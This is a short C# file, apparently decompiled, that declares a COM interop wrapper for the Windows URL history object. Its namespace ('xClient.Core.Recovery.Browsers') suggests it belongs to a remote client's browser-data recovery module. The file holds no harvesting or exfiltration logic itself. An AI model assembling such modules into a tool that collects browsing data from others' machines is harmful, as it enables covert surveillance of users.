using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace xClient.Core.Recovery.Browsers;

[ComImport]
[Guid("3C374A40-BAE4-11CF-BF7D-00AA006946EE")]
public class UrlHistoryClass
{
	[MethodImpl(MethodImplOptions.InternalCall)]
	public extern UrlHistoryClass();
}
